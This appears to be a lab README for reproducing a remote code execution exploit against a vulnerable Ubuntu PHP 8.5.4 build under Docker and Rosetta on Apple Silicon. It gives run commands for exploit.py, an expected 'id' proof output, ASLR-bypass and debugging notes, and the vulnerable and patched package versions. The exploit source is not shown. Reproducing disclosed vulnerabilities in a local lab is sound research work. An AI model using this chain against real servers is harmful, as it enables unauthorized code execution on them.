# Mac / Rosetta guide

> **This is the Apple Silicon Mac version.** The host is ARM64; Docker runs a
> `linux/amd64` guest through Rosetta.

PAC and BTI are ARM64 native protections and do not apply inside the translated
amd64 guest. ASLR is defeated by the two HTTP leaks. Rosetta mainly changes
debugging behavior and the allocator calibration used by the lab.

## Quick start: Ubuntu PHP 8.5.4

```bash
docker compose -f lab/ubuntu-php85/compose.yml up --build -d

python3 exploit.py \
  -u http://127.0.0.1:18080/index.php \
  --profile ubuntu855 \
  -c 'id>/out/p1' \
  --proof-file out/p1 \
  --offsets-file '' \
  --no-auto-offsets
```

Expected proof:

```text
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Detailed calibration and the `R0` / `val.type` clobber analysis are in
[UBUNTU855.md](UBUNTU855.md).

## Quick start: upstream bookworm lab

```bash
docker compose -f docker/docker-compose.yml up -d
python3 exploit.py -u http://127.0.0.1:8088/index.php
cat out/p1
```

## Rosetta-specific debugging notes

- Apache workers appear as `/run/rosetta/rosetta /usr/sbin/apache2`.
- GDB can read memory but cannot reliably read guest registers.
- Patching translated guest code through `/proc/PID/mem` can be masked by a
  cached Rosetta block.
- The Ubuntu calibration used a temporary permanent `int3` at
  `php_session_track_init` plus a preload `SIGTRAP` → `SIGSTOP` trampoline.
- The final exploit uses only HTTP: no GDB, Frida, ptrace, or diagnostic
  preload is required.

## Requirements

- Apple Silicon Mac.
- Docker Desktop with amd64/Rosetta execution enabled.
- Python 3 for the exploit client.
- Single-worker Apache prefork with `mod_php`.

The current verified Mac profile pins Ubuntu's vulnerable
`8.5.4-0ubuntu1.3` package. Ubuntu's current `8.5.4-0ubuntu1.5` includes the
security fix and will not reproduce the chain.
